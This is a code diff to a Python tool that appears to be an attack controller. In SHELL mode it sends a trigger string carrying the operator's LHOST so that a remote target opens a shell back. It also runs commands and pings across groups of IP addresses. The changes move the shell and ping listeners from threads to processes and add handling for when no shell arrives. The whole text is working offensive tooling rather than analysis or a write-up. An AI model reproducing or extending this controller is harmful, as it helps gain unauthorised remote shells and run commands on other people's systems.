@@ -6,8 +6,8 @@ from termcolor import colored
 import os
 import confuse
 import socket, sys, time
-import threading
 import requests
+import multiprocessing
 
 parsedConfig = {}
 
@@ -320,10 +320,15 @@ def ready(params):
                     execute(plaintext, cmdparams)
                 elif baseparams["MODE"] == "SHELL" and verify(shellparams):
                     plaintext = "FC-SH-{}\00".format(params["LHOST"]) 
-                    t = threading.Thread(target=listen, args=())
+                    t = multiprocessing.Process(target=listen, args=())
                     t.start()
                     execute(plaintext, shellparams)
-                    t.join()
+                    try:
+                        t.join()
+                    except KeyboardInterrupt:
+                        t.terminate()
+                        print(colored(f"[-] No shell received.","red")) 
+                        continue
 
                     print(colored("\n[*] Shell closed.\n", "cyan"))
                 elif baseparams["MODE"] == "GROUP" and verify(groupparams):
@@ -342,7 +347,7 @@ def ready(params):
                 if baseparams["MODE"] == "CMD" and verify(cmdparams):
                     print('running ping command')
                     plaintext = initPing(cmdparams)
-                    t = threading.Thread(target=pingListen, args=())
+                    t = multiprocessing.Process(target=pingListen, args=())
                     t.start()
                     execute(plaintext, cmdparams)
                     t.join()
@@ -351,7 +356,7 @@ def ready(params):
                         continue
                     groupList = getGroup()
                     plaintext = initPing(groupparams)
-                    t = threading.Thread(target=pingListen, args=())
+                    t = multiprocessing.Process(target=pingListen, args=())
                     t.start()
                     for iplist in groupList:
                         for ip in iplist:
